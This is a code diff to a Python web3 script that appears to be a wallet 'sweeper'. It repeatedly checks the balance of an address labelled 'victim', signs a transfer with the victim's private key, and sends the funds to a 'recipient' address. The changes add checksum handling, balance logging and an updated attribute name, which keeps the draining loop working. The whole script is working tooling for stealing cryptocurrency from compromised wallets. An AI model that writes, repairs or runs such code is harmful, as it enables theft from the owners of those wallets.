@@ -34,10 +34,15 @@ logger.info(f"gas fee is : {gas_fee}")
 def get_balance_loop():
     balance = 0
     while True:
+        vb = W3.from_wei(W3.eth.get_balance(Web3.to_checksum_address(config.victim_address)), "ether")
+        rb = W3.from_wei(W3.eth.get_balance(Web3.to_checksum_address(config.recipient_address)), "ether")
+        logger.info(f"victim={vb} ETH | recipient={rb} ETH")
+        
         while 0.0005 > balance:
             # Get balance account
+
             try:
-                balance = W3.eth.get_balance(config.victim_address)
+                balance = W3.eth.get_balance(Web3.to_checksum_address(config.victim_address))
                 balance = W3.from_wei(balance, "ether")  # convert to ether value
             except Exception as e:
                 logger.error(f"error , i can't get balance... error: {e}")
@@ -47,18 +52,19 @@ def get_balance_loop():
             logger.info(f"ETH balance: {balance}")
             build_transaction(balance)
         except Exception as e:
+            
             logger.error(f"Error, check balance and Gasfee again error: {e}")
 
 
 def build_transaction(balance):
     try:
         # get nonce number
-        nonce = W3.eth.get_transaction_count(config.victim_address)
+        nonce = W3.eth.get_transaction_count(Web3.to_checksum_address(config.victim_address))
 
         # build transaction
         tx = {
             "nonce": nonce,
-            "to": config.recipient_address,
+            "to": Web3.to_checksum_address(config.recipient_address),
             "value": W3.to_wei(balance, "ether"),
             "gas": 21000,
             "gasPrice": W3.to_wei("56", "gwei"),
@@ -68,7 +74,7 @@ def build_transaction(balance):
         signed_tx = W3.eth.account.sign_transaction(tx, config.victim_key)
 
         # send Transaction
-        tx_hash = W3.eth.send_raw_transaction(signed_tx.rawTransaction)
+        tx_hash = W3.eth.send_raw_transaction(signed_tx.raw_transaction)
 
         logger.info(W3.to_hex(tx_hash))
         logger.info("Transaction Completed\n GET Balance Again...")
